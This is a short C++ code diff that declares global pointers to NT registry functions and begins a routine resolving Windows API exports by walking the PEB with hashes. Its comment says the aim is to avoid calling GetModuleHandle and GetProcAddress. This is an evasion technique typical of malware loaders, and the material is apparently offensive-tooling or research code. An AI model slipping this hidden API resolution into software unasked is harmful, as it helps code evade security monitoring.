@@ -38,6 +38,16 @@ using CryptoPP::ARC4;
 #include "include/cryptopp/des.h"
 using CryptoPP::DES;
 
+// Globals "myFuncs"
+myMessageBox pMyMessageBox;
+myNtOpenKey pMyNtOpenKey;
+myNtQueryKey pMyNtQueryKey;
+myNtEnumerateKey pMyNtEnumerateKey;
+myNtQueryValueKey pMyNtQueryValueKey;
+myNtEnumerateValueKey pMyNtEnumerateValueKey;
+myNtClose pMyNtClose;
+myRtlInitUnicodeString pMyRtlInitUnicodeString;
+
 // Get Address from Export in module by walking PEB. Thus, not calling GetModuleHandle + GetProcAddress.
 FARPROC myGetProcAddress(DWORD moduleHash, DWORD exportHash) {
 	PPEB pPEB = (PPEB)__readgsqword(0x60);
